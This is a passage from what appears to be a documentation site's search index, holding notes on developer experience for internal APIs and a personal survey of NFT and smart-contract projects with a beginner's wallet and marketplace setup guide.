end-to-end. However, multiple teams in your company will do the exact thing and typically will have to go through the same learning experience. To allieviate this: Encourage the use of scaffolding tools such as Yeoman Document the end-to-end process (well suited for a video) Facilitate contact between teams of different API experience level Don't forget the API consumer The definition of done for establishing an internal API is usually I can execute a request and get a response. But remember to cater for current and potential API consumers. Ensure the API producer take pride in their entry in the API portal and take the effort to describe the information an API consumer would be interested in.","title":"Establish"},{"location":"internal-apis/dx-producer-establish/#establish-internal-api","text":"Establishing a new API and performing a successful end-to-end call can be a daunting task the first time it's performed. Here are a few of the steps typically involved: Create OpenAPI contract Upload OpenAPI contract to API portal Define policies in API portal Create API implementation as docker container Host API docker container Network architecture for communicating with back-end database/system from API docker container host Authentication OAuth2 authentication setup - Create client app registration and add internal API dependency OAuth2 authentication approval from admin Get a subscription/API key from the API portal","title":"Establish internal API"},{"location":"internal-apis/dx-producer-establish/#scaffolding","text":"The establish phase is not executed very regularly executed by a single team and these kinds of process are typically not well documented end-to-end. However, multiple teams in your company will do the exact thing and typically will have to go through the same learning experience. To allieviate this: Encourage the use of scaffolding tools such as Yeoman Document the end-to-end process (well suited for a video) Facilitate contact between teams of different API experience level","title":"Scaffolding"},{"location":"internal-apis/dx-producer-establish/#dont-forget-the-api-consumer","text":"The definition of done for establishing an internal API is usually I can execute a request and get a response. But remember to cater for current and potential API consumers. Ensure the API producer take pride in their entry in the API portal and take the effort to describe the information an API consumer would be interested in.","title":"Don't forget the API consumer"},{"location":"internal-apis/dx-producer-first-release/","text":"First release The first release of an internal API is always an important milestone. In this process, it's easy to lose focus on the API consumer(s) in this process and what they need in order to create value for the business based on the API. API consumer focus Do not finalize the release before the API consumer has the information they need. Test your documentation by having someone in the team setup a API consumer using only the information they find in the documentation. Release notes Create release notes for the first release and focus on what functionality is available to business consumers. Drive adoption by making these release notes available inside your company and not just for the intended API consumer. API portal could have a feed showing the latest release with corresponding release notes. Monitoring After going live, monitor the request/response log based on the activity of the API consumers. In many cases, you will discover they use the endpoint in a different manner than you expected or perhaps you will find edge cases where request have failed for example due to missing encoding of special characters in parameters. Over time, you'll want to automate this process. For example, you could have a batch job running in the morning reporting all failed requests into a slack channel monitored by the DevOps team.","title":"First release"},{"location":"internal-apis/dx-producer-first-release/#first-release","text":"The first release of an internal API is always an important milestone. In this process, it's easy to lose focus on the API consumer(s) in this process and what they need in order to create value for the business based on the API.","title":"First release"},{"location":"internal-apis/dx-producer-first-release/#api-consumer-focus","text":"Do not finalize the release before the API consumer has the information they need. Test your documentation by having someone in the team setup a API consumer using only the information they find in the documentation.","title":"API consumer focus"},{"location":"internal-apis/dx-producer-first-release/#release-notes","text":"Create release notes for the first release and focus on what functionality is available to business consumers. Drive adoption by making these release notes available inside your company and not just for the intended API consumer. API portal could have a feed showing the latest release with corresponding release notes.","title":"Release notes"},{"location":"internal-apis/dx-producer-first-release/#monitoring","text":"After going live, monitor the request/response log based on the activity of the API consumers. In many cases, you will discover they use the endpoint in a different manner than you expected or perhaps you will find edge cases where request have failed for example due to missing encoding of special characters in parameters. Over time, you'll want to automate this process. For example, you could have a batch job running in the morning reporting all failed requests into a slack channel monitored by the DevOps team.","title":"Monitoring"},{"location":"internal-apis/dx-producer-maturing/","text":"Maturing features In order to fullfil a business outcome, there is likely a set of endpoints and resource models in the OpenAPI contract to be defined. To do this it's essential to understand: The flow in the first API consumer application How the resources are represented in the data model of the back-end Business process context the API consumer application and the back-end relate to Involve API consumer Involve the API consumer in the maturing. Understand how the API endpoints will be used and what kind of data the front-end has available at that point of time. Create a branch of the OpenAPI contract for maturing the feature. As early as possible, use a mock server or a dev instance of the API portal to have the new planned endpoints return mock data for testing by the API consumer. Generate documentation for the new planned endpoints of OpenAPI contract as this is more understandable than the raw OpenAPI file for many API consumers. In most cases, the internal funding for the implementation comes from the API consumer side. Who to involve in the maturing? This is an area where there are many different elements which must be balanced. Usually there is 1-2 persons in a DevOps team which are the drivers for the structures and principles of the OpenAPI contract. The DevOps team is typically mid-sprint when the maturing is natural to perform, and their minds are focused on the deliverables of the current sprint and not on potential future needs. The product owner from the business typically has broad base of domain knowledge and has access to specialist for concrete cases. However, they are typically not the drivers for the details in the OpenAPI specification. In my experience, meetings with 3+ participants where the goal is create an OpenAPI contract definition from scratch for a new feature rarely are efficient. It's better to have a draft be created in advanced and then this can be presented and adjusted after discussions. However, this approach makes the process dependant on individual persons and if they are away it may stop maturing process. To mitigate this, it's important to involve the whole DevOps team in the code review of the OpenAPI specification and ensure they know the necessary tooling for updating it. Domain knowledge Seek out business process description and governing documents for the area. Use precise terminolgy and prefer naming taken from international standard where appropriate OpenAPI contract source when code is implemented TBD","title":"Maturing features"},{"location":"internal-apis/dx-producer-maturing/#maturing-features","text":"In order to fullfil a business outcome, there is likely a set of endpoints and resource models in the OpenAPI contract to be defined. To do this it's essential to understand: The flow in the first API consumer application How the resources are represented in the data model of the back-end Business process context the API consumer application and the back-end relate to","title":"Maturing features"},{"location":"internal-apis/dx-producer-maturing/#involve-api-consumer","text":"Involve the API consumer in the maturing. Understand how the API endpoints will be used and what kind of data the front-end has available at that point of time. Create a branch of the OpenAPI contract for maturing the feature. As early as possible, use a mock server or a dev instance of the API portal to have the new planned endpoints return mock data for testing by the API consumer. Generate documentation for the new planned endpoints of OpenAPI contract as this is more understandable than the raw OpenAPI file for many API consumers. In most cases, the internal funding for the implementation comes from the API consumer side.","title":"Involve API consumer"},{"location":"internal-apis/dx-producer-maturing/#who-to-involve-in-the-maturing","text":"This is an area where there are many different elements which must be balanced. Usually there is 1-2 persons in a DevOps team which are the drivers for the structures and principles of the OpenAPI contract. The DevOps team is typically mid-sprint when the maturing is natural to perform, and their minds are focused on the deliverables of the current sprint and not on potential future needs. The product owner from the business typically has broad base of domain knowledge and has access to specialist for concrete cases. However, they are typically not the drivers for the details in the OpenAPI specification. In my experience, meetings with 3+ participants where the goal is create an OpenAPI contract definition from scratch for a new feature rarely are efficient. It's better to have a draft be created in advanced and then this can be presented and adjusted after discussions. However, this approach makes the process dependant on individual persons and if they are away it may stop maturing process. To mitigate this, it's important to involve the whole DevOps team in the code review of the OpenAPI specification and ensure they know the necessary tooling for updating it.","title":"Who to involve in the maturing?"},{"location":"internal-apis/dx-producer-maturing/#domain-knowledge","text":"Seek out business process description and governing documents for the area. Use precise terminolgy and prefer naming taken from international standard where appropriate","title":"Domain knowledge"},{"location":"internal-apis/dx-producer-maturing/#openapi-contract-source-when-code-is-implemented","text":"TBD","title":"OpenAPI contract source when code is implemented"},{"location":"internal-apis/dx-producer-operational/","text":"Operational excellency The DevOps team should be given the mandate to automate as much of the operational tasks as possible. Uptime monitoring for API consumers In the API portal, have a common pattern for API uptime monitoring where the focus group is API consumers. For example, each API could have a health endpoint which performs an end-to-end call and has a standard payload. Have an uptime status page where all the health statuses are presented. Overtime, this can be extended to provide alerts based on a publish/subscribe pattern. Uptime monitoring for API producer Do automated tests at least every hour through a background script and send alerts on failure to the DevOps team (for example through slack) It should be a clear goal that the DevOps team should be aware of issues and working on resolving them, before it is reported by API consumers. Operational issues Prepare a process for how to handle operational issues which require an emergency change. Include responsibilities and stepwise explanation on how to continously inform affected API consumers of the progress. Monitoring of users with missing authorization A very common error in internal APIs, is that the end-user is missing some rights in the back-end system. Provide detailed error messages in these cases and work with API consumers on how to reduce the likelihood of such cases. Expiring keys and certificates Have a calendar for expiring keys and certificates and make sure their are update well in advance of the expiry.","title":"Operational excellency"},{"location":"internal-apis/dx-producer-operational/#operational-excellency","text":"The DevOps team should be given the mandate to automate as much of the operational tasks as possible.","title":"Operational excellency"},{"location":"internal-apis/dx-producer-operational/#uptime-monitoring-for-api-consumers","text":"In the API portal, have a common pattern for API uptime monitoring where the focus group is API consumers. For example, each API could have a health endpoint which performs an end-to-end call and has a standard payload. Have an uptime status page where all the health statuses are presented. Overtime, this can be extended to provide alerts based on a publish/subscribe pattern.","title":"Uptime monitoring for API consumers"},{"location":"internal-apis/dx-producer-operational/#uptime-monitoring-for-api-producer","text":"Do automated tests at least every hour through a background script and send alerts on failure to the DevOps team (for example through slack) It should be a clear goal that the DevOps team should be aware of issues and working on resolving them, before it is reported by API consumers.","title":"Uptime monitoring for API producer"},{"location":"internal-apis/dx-producer-operational/#operational-issues","text":"Prepare a process for how to handle operational issues which require an emergency change. Include responsibilities and stepwise explanation on how to continously inform affected API consumers of the progress.","title":"Operational issues"},{"location":"internal-apis/dx-producer-operational/#monitoring-of-users-with-missing-authorization","text":"A very common error in internal APIs, is that the end-user is missing some rights in the back-end system. Provide detailed error messages in these cases and work with API consumers on how to reduce the likelihood of such cases.","title":"Monitoring of users with missing authorization"},{"location":"internal-apis/dx-producer-operational/#expiring-keys-and-certificates","text":"Have a calendar for expiring keys and certificates and make sure their are update well in advance of the expiry.","title":"Expiring keys and certificates"},{"location":"internal-apis/dx-producer-overview/","text":"Developer experience for API producer An API in itself doesn't deliver value before it's consumed. The choices and actions the API producers make when creating the API have a strong correlation to the likelihood the API will deliver value to additional API consumers and evolve over time. For internal APIs there are in general three typical starting points: API for connecting front-end and back-end of one system API for exposing data from one back-end system to another front-end system API for exposing data from one back-end system to another back-end system A common scenario is that APIs start as 1. and then evolve over time to include to 2. and possibly 3. Each of these evolution typically have a significant fricition due: Technical debt of using API in way it was not initially designed for API initially specialized to snuggly fit the first consumer front-end Different authentication methods Creating a dependency between DevOps teams To reduce this friction and realize potential value, it's essential to take into consideration future API consumers from the start. Companies investing in digitalization programs, quickly see the first initiatives are using most of their effort on making data and functions available and not on combining them in novel new ways creating business growth. To achieve business agility, APIs must be the foundation layer already in place and ready to be used.","title":"Overview"},{"location":"internal-apis/dx-producer-overview/#developer-experience-for-api-producer","text":"An API in itself doesn't deliver value before it's consumed. The choices and actions the API producers make when creating the API have a strong correlation to the likelihood the API will deliver value to additional API consumers and evolve over time. For internal APIs there are in general three typical starting points: API for connecting front-end and back-end of one system API for exposing data from one back-end system to another front-end system API for exposing data from one back-end system to another back-end system A common scenario is that APIs start as 1. and then evolve over time to include to 2. and possibly 3. Each of these evolution typically have a significant fricition due: Technical debt of using API in way it was not initially designed for API initially specialized to snuggly fit the first consumer front-end Different authentication methods Creating a dependency between DevOps teams To reduce this friction and realize potential value, it's essential to take into consideration future API consumers from the start. Companies investing in digitalization programs, quickly see the first initiatives are using most of their effort on making data and functions available and not on combining them in novel new ways creating business growth. To achieve business agility, APIs must be the foundation layer already in place and ready to be used.","title":"Developer experience for API producer"},{"location":"internal-apis/dx-producer-release-strategy/","text":"Release strategy Have a predicatable process around release and ensure API consumer are aware of it. Having a fixed release schedule for new functionality every two weeks or every month can provide a more predictable planning for the API consumers. A fixed release schedule will likely ease frictions when several API consumer have different prioritize on what should be delivered first. Release epic Plan releases so that there is a main focus for the release. This can for example be several endpoints for a new resource or supporting a new use case from start to finish. Bugfixes Fix bugs as quickly as possible if they are important for API consumers. If there is a bug identified in the morning, ideally it should be fixed by lunch. If this is possible, work with the API consumers to find a suitable workround.","title":"Release strategy"},{"location":"internal-apis/dx-producer-release-strategy/#release-strategy","text":"Have a predicatable process around release and ensure API consumer are aware of it. Having a fixed release schedule for new functionality every two weeks or every month can provide a more predictable planning for the API consumers. A fixed release schedule will likely ease frictions when several API consumer have different prioritize on what should be delivered first.","title":"Release strategy"},{"location":"internal-apis/dx-producer-release-strategy/#release-epic","text":"Plan releases so that there is a main focus for the release. This can for example be several endpoints for a new resource or supporting a new use case from start to finish.","title":"Release epic"},{"location":"internal-apis/dx-producer-release-strategy/#bugfixes","text":"Fix bugs as quickly as possible if they are important for API consumers. If there is a bug identified in the morning, ideally it should be fixed by lunch. If this is possible, work with the API consumers to find a suitable workround.","title":"Bugfixes"},{"location":"smart-contract-usage/","text":"Smart contract usage Decentralized applications using smart contracts on the blockchain as a backend have a tremendous momentum. Multiple use case has already been discovered, but it's still early days and has a significant risk involved. Early adopters need to be extra careful with scams, unintentional errors in smart contracts, high transaction cost and so on. During my ThinkWeek I've looked into various existing use cases that already show potential. This is not intended to be an exhaustive list but to show prominent examples of the various types. Getting started as a user It may seems daunting at first to get started as user of smart contract projects. There definitively will be innovation on simplifying the user setup, but for technical adapt persons it's quite straightforward already today Step 1: Get yourself a hardware wallet To me, a hardware wallet is a must if you are going to own items of significant value. It mitigates risk related to virus, keyloggers, rogue extension as the transaction signing is done on the device. Recommend the Trezor One which cost approximately 50 euros. Step 2: Acquire some ETH Almost all smart contract projects today are running on the Ethereum blockchain, so to interact you need to own the currency ETH. A simple way of acquiring ETH in Norway is to use the MiraiEx exchange . It's registered with the Norwegian Finanstilsynet, you log on with Vipps and has simple support moving NOK from norwegian banks. Please don't aquire more ETH than you can afford to lose. Once you have acquired some ETH in MiraiEx, you need to move it to your hardware wallet. To do this, you create an Ethereum account on your hardware wallet and supply this address to a withdrawl transaction from MiraiEx. Step 3: Install MetaMask MetaMask has become the defacto interface to blockchain apps (it's also a wallet). Whenever you navigate to a site which sells smart contract projects, it will typically ask you to log on to MetaMask and this will represent your user. You will then connect your hardware wallet as an account in MetaMask. The instructions are found in How to connect a Trazor or Ledger Hardware Wallet . Step 4: Log in to marketplace https://opensea.io/ is the dominant marketplace and will allow trade regardless of where the NFT token was initially created. Step 5: Stay up to date Twitter and Discord are the two main channels to keep any eye out for what is happening in the space. Each project typically has their own discord environment where there is alot of activity between collectors. Step 6: Buy your first NFT A lot of NFTs have a current listing price. By clicking Buy Now in Opensea, the MetaMask plugin will ask you to confirm the transaction and the expected transaction cost (called gas in Ethereum). Once the transaction is completed, the NFT is immediately available in your account which resides in the hardware wallet. If the transaction cost supplied is lower than the rest of the market, miners will add your transaction to the blockchain and you will be left waiting. If this is the case, you can go to MetaMask and select speed up transaction. Here you can set the transaction cost as fast and it will likely be completed in a few seconds. Do not cancel the transaction as then you still pay the transaction cost. Some NFTs are up for auction. You then typically use wrapped ETH (WETH) which allows you to bid on many items in parallell (even if you don't have the balance to buy them all). Convert 1-1 between ETH and WETH in MetaMask. Step 7: Enjoy your tax return Tax return will be come a bit more complicated and not all rules are in place for NFTs. Norwegian Skatteettaten has some information at Skatte- og merverdiavgiftsmessig behandling av bitcoins og andre virtuelle valutaer and Krypto for kongeriket recently had a stream called Skatt og Krypto til Frokost: Bitcoin, DeFi og NFT | OBC, EY & Skatteetaten shown below","title":"Overview"},{"location":"smart-contract-usage/#smart-contract-usage","text":"Decentralized applications using smart contracts on the blockchain as a backend have a tremendous momentum. Multiple use case has already been discovered, but it's still early days and has a significant risk involved. Early adopters need to be extra careful with scams, unintentional errors in smart contracts, high transaction cost and so on. During my ThinkWeek I've looked into various existing use cases that already show potential. This is not intended to be an exhaustive list but to show prominent examples of the various types.","title":"Smart contract usage"},{"location":"smart-contract-usage/#getting-started-as-a-user","text":"It may seems daunting at first to get started as user of smart contract projects. There definitively will be innovation on simplifying the user setup, but for technical adapt persons it's quite straightforward already today","title":"Getting started as a user"},{"location":"smart-contract-usage/#step-1-get-yourself-a-hardware-wallet","text":"To me, a hardware wallet is a must if you are going to own items of significant value. It mitigates risk related to virus, keyloggers, rogue extension as the transaction signing is done on the device. Recommend the Trezor One which cost approximately 50 euros.","title":"Step 1: Get yourself a hardware wallet"},{"location":"smart-contract-usage/#step-2-acquire-some-eth","text":"Almost all smart contract projects today are running on the Ethereum blockchain, so to interact you need to own the currency ETH. A simple way of acquiring ETH in Norway is to use the MiraiEx exchange . It's registered with the Norwegian Finanstilsynet, you log on with Vipps and has simple support moving NOK from norwegian banks. Please don't aquire more ETH than you can afford to lose. Once you have acquired some ETH in MiraiEx, you need to move it to your hardware wallet. To do this, you create an Ethereum account on your hardware wallet and supply this address to a withdrawl transaction from MiraiEx.","title":"Step 2: Acquire some ETH"},{"location":"smart-contract-usage/#step-3-install-metamask","text":"MetaMask has become the defacto interface to blockchain apps (it's also a wallet). Whenever you navigate to a site which sells smart contract projects, it will typically ask you to log on to MetaMask and this will represent your user. You will then connect your hardware wallet as an account in MetaMask. The instructions are found in How to connect a Trazor or Ledger Hardware Wallet .","title":"Step 3: Install MetaMask"},{"location":"smart-contract-usage/#step-4-log-in-to-marketplace","text":"https://opensea.io/ is the dominant marketplace and will allow trade regardless of where the NFT token was initially created.","title":"Step 4: Log in to marketplace"},{"location":"smart-contract-usage/#step-5-stay-up-to-date","text":"Twitter and Discord are the two main channels to keep any eye out for what is happening in the space. Each project typically has their own discord environment where there is alot of activity between collectors.","title":"Step 5: Stay up to date"},{"location":"smart-contract-usage/#step-6-buy-your-first-nft","text":"A lot of NFTs have a current listing price. By clicking Buy Now in Opensea, the MetaMask plugin will ask you to confirm the transaction and the expected transaction cost (called gas in Ethereum). Once the transaction is completed, the NFT is immediately available in your account which resides in the hardware wallet. If the transaction cost supplied is lower than the rest of the market, miners will add your transaction to the blockchain and you will be left waiting. If this is the case, you can go to MetaMask and select speed up transaction. Here you can set the transaction cost as fast and it will likely be completed in a few seconds. Do not cancel the transaction as then you still pay the transaction cost. Some NFTs are up for auction. You then typically use wrapped ETH (WETH) which allows you to bid on many items in parallell (even if you don't have the balance to buy them all). Convert 1-1 between ETH and WETH in MetaMask.","title":"Step 6: Buy your first NFT"},{"location":"smart-contract-usage/#step-7-enjoy-your-tax-return","text":"Tax return will be come a bit more complicated and not all rules are in place for NFTs. Norwegian Skatteettaten has some information at Skatte- og merverdiavgiftsmessig behandling av bitcoins og andre virtuelle valutaer and Krypto for kongeriket recently had a stream called Skatt og Krypto til Frokost: Bitcoin, DeFi og NFT | OBC, EY & Skatteetaten shown below","title":"Step 7: Enjoy your tax return"},{"location":"smart-contract-usage/art/","text":"Art Art has been central in the NFT space, but traditional artist have not set their mark. Sales of artwork are in many cases seen as patronage by collectors. Many of the art project has novel ideas such as Ghxsts ability to combine two works or The Underground Sistine Chapel being broken into over 400 pieces and one of them contained the signature of the work. Beeple Significance: Pioneer in 3D digital arts and NFTs Editions: Typically 1 \"In May 2007, the digital artist known as Beeple set out to create and post a new work of art online every day. He hasn\u2019t missed a day since, creating a new digital picture every day for 5,000 days straight. Individually known as EVERYDAYS, collectively, the pieces form the core of EVERYDAYS: THE FIRST 5000 DAYS, one of the most unique bodies of work to emerge in the history of digital art. Consumers of internet culture will already be familiar with the prolific digital output of graphic designer and motion artist Mike Winkelmann, better known as Beeple. The South Carolina-based artist\u2019s visionary, and often irreverent, digital pictures launched his meteoric rise to the top of the digital art world. He\u2019s attracted 1.8 million followers on Instagram and high-profile collaborations with global brands ranging from Louis Vuitton to Nike, as well as performing artists from Katy Perry to Childish Gambino.\" - from Christie's auction of The First 5000 days The First 5000 days sold for $69 million. XCopy Significance: Art style and legendary figure in space Editions: Typically 10 \"XCOPY is a London based crypto artist. XCOPY has been a part of the crypto art community from the start - he was on SuperRare from launch and has released over 100 NFTs on the platform. His continued success on various crypto art platforms has led to him becoming a legendary figure in the space.\" - from artist site at niftygateway Ghxsts Significance: New artist discovered due to art style and NFTs Editions: Typically 1, but some more approachable works have 30 Popular new artist where the NFTs can be combined to create new art on the blockchain. Ghxsts on Opensea The Underground Sistine Chapel by Pascal Boyart Significance: Established artist and physical work Editions: Each figure on the paining is a single NFT \"The Underground Sistine Chapel is a modern version of Michelangelo's masterpiece, painted by Pascal Boyart during the 2020 lockdowns. The work was produced over a period of 5 months in a former gold foundry close to Paris. Each NFT represents one of the 400 characters in the Last Judgment fresco. All NFTs are 1/1 editions.\" - from artist website Project from famous graffiti artist Pboy The Underground Sistine Chapel on Opensea Forever rose Significance: Collaboration project Editions: Unsure http://www.foreverrose.io/","title":"Art"},{"location":"smart-contract-usage/art/#art","text":"Art has been central in the NFT space, but traditional artist have not set their mark. Sales of artwork are in many cases seen as patronage by collectors. Many of the art project has novel ideas such as Ghxsts ability to combine two works or The Underground Sistine Chapel being broken into over 400 pieces and one of them contained the signature of the work.","title":"Art"},{"location":"smart-contract-usage/art/#beeple","text":"Significance: Pioneer in 3D digital arts and NFTs Editions: Typically 1 \"In May 2007, the digital artist known as Beeple set out to create and post a new work of art online every day. He hasn\u2019t missed a day since, creating a new digital picture every day for 5,000 days straight. Individually known as EVERYDAYS, collectively, the pieces form the core of EVERYDAYS: THE FIRST 5000 DAYS, one of the most unique bodies of work to emerge in the history of digital art. Consumers of internet culture will already be familiar with the prolific digital output of graphic designer and motion artist Mike Winkelmann, better known as Beeple. The South Carolina-based artist\u2019s visionary, and often irreverent, digital pictures launched his meteoric rise to the top of the digital art world. He\u2019s attracted 1.8 million followers on Instagram and high-profile collaborations with global brands ranging from Louis Vuitton to Nike, as well as performing artists from Katy Perry to Childish Gambino.\" - from Christie's auction of The First 5000 days The First 5000 days sold for $69 million.","title":"Beeple"},{"location":"smart-contract-usage/art/#xcopy","text":"Significance: Art style and legendary figure in space Editions: Typically 10 \"XCOPY is a London based crypto artist. XCOPY has been a part of the crypto art community from the start - he was on SuperRare from launch and has released over 100 NFTs on the platform. His continued success on various crypto art platforms has led to him becoming a legendary figure in the space.\" - from artist site at niftygateway","title":"XCopy"},{"location":"smart-contract-usage/art/#ghxsts","text":"Significance: New artist discovered due to art style and NFTs Editions: Typically 1, but some more approachable works have 30 Popular new artist where the NFTs can be combined to create new art on the blockchain. Ghxsts on Opensea","title":"Ghxsts"},{"location":"smart-contract-usage/art/#the-underground-sistine-chapel-by-pascal-boyart","text":"Significance: Established artist and physical work Editions: Each figure on the paining is a single NFT \"The Underground Sistine Chapel is a modern version of Michelangelo's masterpiece, painted by Pascal Boyart during the 2020 lockdowns. The work was produced over a period of 5 months in a former gold foundry close to Paris. Each NFT represents one of the 400 characters in the Last Judgment fresco. All NFTs are 1/1 editions.\" - from artist website Project from famous graffiti artist Pboy The Underground Sistine Chapel on Opensea","title":"The Underground Sistine Chapel by Pascal Boyart"},{"location":"smart-contract-usage/art/#forever-rose","text":"Significance: Collaboration project Editions: Unsure http://www.foreverrose.io/","title":"Forever rose"},{"location":"smart-contract-usage/collectibles/","text":"Collectibles Cryptopunks - 2017 Significance: Considered the first NFT collectible Editions: 10000 unique \"The CryptoPunks are 24x24 pixel art images, generated algorithmically. Most are punky-looking guys and girls, but there are a few rarer types mixed in: Apes, Zombies and even the odd Alien. Every punk has their own profile page that shows their attributes as well as their ownership/for-sale status\" - from CryptoPunks webiste The auction house Christie's had an auction 12. May where 6 rare cryptopunks were sold for ~$17 million. The auction house Sootheby's will have an auction of Cryptopunk #7523 10.June. Total value of sales ~185 000 ETH ($486 million dollars) Floor: 15ETH NBA Top shots - 2020 Significance: 800 000 users and most are not cryptosavy Editions: The number of editions pr NBA Top Shot moments dependens on rarity. From 50 for legendary to 10000 or more for commons \"Hundreds of thousands of NBA fans from around the world have started collecting the most memorable Moments from NBA history. Only a scarce number of Top Shot Moments are released, so building the best collection requires a scout\u2019s eye and a superstar\u2019s dedication. Become a top collector by snagging in-demand packs when they drop and refine your roster by finding diamond-in-the-rough Moments on the marketplace\" - from NBA Topshots Dapper Labs was behind this project and they have a history of making success on their projects. Mooncats - 2017 Significance: Early pioneer Editions: 25600 \"This project is an exploration of the ability to release tradable collectibles and record their ownership on the Ethereum blockchain. Instead of selling all of the MoonCats as the contract owner or giving all of the MoonCats away, we have given people the opportunity to find MoonCats by using their computers to generate a seed that hashes to an available and unique catId. This seed can then be submitted to the contract to rescue the corresponding MoonCat. The resulting MoonCat is initially owned by the Ethereum address that submitted it. An off chain algorithm, the MD5 checksum of which is stored in the contract, parses the catId into its unique corresponding MoonCat image. This allows you to verify that your catId corresponds to your MoonCat image. \" - from MoonCatRescue Mooncast on Opensea Bored Ape Yacht Club - 2021 Significance: Momentum in marked and bringing in new collectors Editions: 10000 \"The Bored Ape Yacht Club is a collection of 10,000 unique Bored Ape NFTs\u2014 unique digital collectibles living on the Ethereum blockchain. Your Bored Ape doubles as your Yacht Club membership card, and grants access to members-only benefits, the first of which is access to THE BATHROOM, a collaborative graffiti board.\" - from BoredApeYachtClub Bored Ape Yacht Club on OpenSea Hashmasks Significance: Bridging collectibles and art Editions: 16384 \"Hashmasks is a living digital art collectible created by over 70 artists globally. It is a collection of 16,384 unique digital portraits. By holding the artwork, you accumulate the NCT token on a daily basis, which allows you to choose a name for your portrait on the Ethereum blockchain.\" - from Hashmasks Blob mob Significance: Project in forming phase and relies on cuteness factor Editions: 999 \"Here at the Blob Laboratory, we have perfected the most bulbous characters to ever walk in the metaverse. Each Blob is meticulously handcrafted with a unique combination of traits. Each Blob is a 1 of 1 and a proud member of the Blob Mob. The Blobs will be released on OpenSea as NFTs and can be collected, used as a profile photo, traded, or sold.\" - from project website","title":"Collectibles"},{"location":"smart-contract-usage/collectibles/#collectibles","text":"","title":"Collectibles"},{"location":"smart-contract-usage/collectibles/#cryptopunks-2017","text":"Significance: Considered the first NFT collectible Editions: 10000 unique \"The CryptoPunks are 24x24 pixel art images, generated algorithmically. Most are punky-looking guys and girls, but there are a few rarer types mixed in: Apes, Zombies and even the odd Alien. Every punk has their own profile page that shows their attributes as well as their ownership/for-sale status\" - from CryptoPunks webiste The auction house Christie's had an auction 12. May where 6 rare cryptopunks were sold for ~$17 million. The auction house Sootheby's will have an auction of Cryptopunk #7523 10.June. Total value of sales ~185 000 ETH ($486 million dollars) Floor: 15ETH","title":"Cryptopunks - 2017"},{"location":"smart-contract-usage/collectibles/#nba-top-shots-2020","text":"Significance: 800 000 users and most are not cryptosavy Editions: The number of editions pr NBA Top Shot moments dependens on rarity. From 50 for legendary to 10000 or more for commons \"Hundreds of thousands of NBA fans from around the world have started collecting the most memorable Moments from NBA history. Only a scarce number of Top Shot Moments are released, so building the best collection requires a scout\u2019s eye and a superstar\u2019s dedication. Become a top collector by snagging in-demand packs when they drop and refine your roster by finding diamond-in-the-rough Moments on the marketplace\" - from NBA Topshots Dapper Labs was behind this project and they have a history of making success on their projects.","title":"NBA Top shots - 2020"},{"location":"smart-contract-usage/collectibles/#mooncats-2017","text":"Significance: Early pioneer Editions: 25600 \"This project is an exploration of the ability to release tradable collectibles and record their ownership on the Ethereum blockchain. Instead of selling all of the MoonCats as the contract owner or giving all of the MoonCats away, we have given people the opportunity to find MoonCats by using their computers to generate a seed that hashes to an available and unique catId. This seed can then be submitted to the contract to rescue the corresponding MoonCat. The resulting MoonCat is initially owned by the Ethereum address that submitted it. An off chain algorithm, the MD5 checksum of which is stored in the contract, parses the catId into its unique corresponding MoonCat image. This allows you to verify that your catId corresponds to your MoonCat image. \" - from MoonCatRescue Mooncast on Opensea","title":"Mooncats - 2017"},{"location":"smart-contract-usage/collectibles/#bored-ape-yacht-club-2021","text":"Significance: Momentum in marked and bringing in new collectors Editions: 10000 \"The Bored Ape Yacht Club is a collection of 10,000 unique Bored Ape NFTs\u2014 unique digital collectibles living on the Ethereum blockchain. Your Bored Ape doubles as your Yacht Club membership card, and grants access to members-only benefits, the first of which is access to THE BATHROOM, a collaborative graffiti board.\" - from BoredApeYachtClub Bored Ape Yacht Club on OpenSea","title":"Bored Ape Yacht Club - 2021"},{"location":"smart-contract-usage/collectibles/#hashmasks","text":"Significance: Bridging collectibles and art Editions: 16384 \"Hashmasks is a living digital art collectible created by over 70 artists globally. It is a collection of 16,384 unique digital portraits. By holding the artwork, you accumulate the NCT token on a daily basis, which allows you to choose a name for your portrait on the Ethereum blockchain.\" - from Hashmasks","title":"Hashmasks"},{"location":"smart-contract-usage/collectibles/#blob-mob","text":"Significance: Project in forming phase and relies on cuteness factor Editions: 999 \"Here at the Blob Laboratory, we have perfected the most bulbous characters to ever walk in the metaverse. Each Blob is meticulously handcrafted with a unique combination of traits. Each Blob is a 1 of 1 and a proud member of the Blob Mob. The Blobs will be released on OpenSea as NFTs and can be collected, used as a profile photo, traded, or sold.\" - from project website","title":"Blob mob"},{"location":"smart-contract-usage/defi/","text":"DeFi Investigating DeFi (aka. Decentralized finance) was not in scope for the ThinkWeek. Smart contracts are central in DeFi and I have just namedropped a few interesting projects/companies. Uniswap Polygon (previously Matic) Aave Chainlink","title":"DeFi"},{"location":"smart-contract-usage/defi/#defi","text":"Investigating DeFi (aka. Decentralized finance) was not in scope for the ThinkWeek. Smart contracts are central in DeFi and I have just namedropped a few interesting projects/companies.","title":"DeFi"},{"location":"smart-contract-usage/defi/#uniswap","text":"","title":"Uniswap"},{"location":"smart-contract-usage/defi/#polygon-previously-matic","text":"","title":"Polygon (previously Matic)"},{"location":"smart-contract-usage/defi/#aave","text":"","title":"Aave"},{"location":"smart-contract-usage/defi/#chainlink","text":"","title":"Chainlink"},{"location":"smart-contract-usage/exclusive-access/","text":"Exclusive access Marshmello The holder of the TinToy token will be invited to join one (1), ninety (90) minute virtual album listening party with Marshmello. In addition, this token is verifiable for: Invitation to a two (2) hour Studio Session with Marshmello and his one surprise guest Invitation to be a part of Marshmello\u2019s entourage for one (1) day at a show of your choice with a ten thousand dollar ($10,000) Mello credit Compete with Marshmello in COD or a mutually agreed upon game for one (1) hour Two (2) premium Vegas Residency tickets with additional backstage access to meet Marshmello One (1) Marshmello x x Aaron Kai Painted Helmet From auction were price ended at $5,5 million from tweet Kings of Leon \"What comes with the NFT: 1 - Digital album download 1 - Limited edition NFT Golden Eye Vinyl 1 - Digital collectible album artwork\" - from OpenSea collection The NFT auction was performed at Yellowheart VeeFriends \"VeeFriends is the name of Gary Vaynerchuk\u2019s NFT collection. He created VeeFriends to bring to life his ambitions of building a community around his creative and business passions using NFT technology and their smart contract capabilities.By owning a VeeFriend NFT, you immediately become part of the VeeFriends community and get access to VeeCon. All VeeFriends token owners get access to VeeCon. VeeCon is a multi-day event exclusively for NFT holders. Your NFT will give you a three year access pass. The conference will be focused around business, marketing, ideas, creativity, entrepreneurship, innovation, competition and of course, fun. Gary\u2019s focus is to curate the best experience for his community, bringing enormous access and informational value to all the VeeFriends token holders in attendance.\" - from veefriend's website","title":"Exclusive 